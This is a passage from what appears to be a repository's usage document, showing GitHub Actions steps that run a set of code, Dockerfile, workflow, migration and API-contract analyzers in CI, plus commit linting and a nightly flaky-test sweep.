Safety: it refuses to run on a dirty tree, `--verify` first confirms the command passes at `--good` and fails at `--bad`, and it always restores your original branch on exit. _(Commit hashes above are illustrative placeholders; the interleaved `AssertionError` tracebacks are your test command's own output at the bad commits.)_

---

## Using the analyzers in CI

Each analyzer exits non-zero when a finding meets `--fail-on`, so they drop straight into a pipeline. Example GitHub Actions step:

```yaml
- name: Guard rails
  run: |
    python3 plugins/migration-guard/skills/migration-guard/scripts/analyze_migration.py db/migrate/*.sql --fail-on high
    python3 plugins/llm-app-doctor/skills/llm-app-doctor/scripts/analyze_llm_code.py ./src --fail-on high
    python3 plugins/dockerfile-doctor/skills/dockerfile-doctor/scripts/analyze_dockerfile.py Dockerfile --fail-on high
    python3 plugins/env-doctor/skills/env-doctor/scripts/analyze_env.py . --fail-on high
    python3 plugins/actions-guard/skills/actions-guard/scripts/analyze_workflow.py . --fail-on high
    python3 plugins/compose-guard/skills/compose-guard/scripts/analyze_compose.py . --fail-on high
    python3 plugins/a11y-guard/skills/a11y-guard/scripts/analyze_a11y.py ./src --fail-on high
```

`commit-lint` gates the PR's own commits, and `flaky-test-hunter` is best run on a schedule (or against the tests a PR touches) rather than on every push:

```yaml
- name: Commit messages
  run: |
    python3 plugins/commit-lint/skills/commit-lint/scripts/commit_lint.py lint \
      --range origin/${{ github.base_ref }}..HEAD --fail-on high

- name: Flaky test sweep (nightly)
  run: |
    python3 plugins/flaky-test-hunter/skills/flaky-test-hunter/scripts/hunt_flaky.py \
      -n 20 --cmd "pytest -q"
```

`api-contract-guard` takes the *old* and *new* schema as two arguments, so in CI diff the base branch against the PR:

```yaml
- name: Breaking API change check
  run: |
    git show origin/main:openapi.json > /tmp/old.json
    python3 plugins/api-contract-guard/skills/api-contract-guard/scripts/analyze_contract.py /tmp/old.json openapi.json --fail-on high
```

This repo's own CI (`.github/workflows/ci.yml`) runs the full harness `tests/run_all.py` across Python 3.9–3.12 on every push.

## Reproduce this document

```bash
python3 tests/gen_usage.py
```
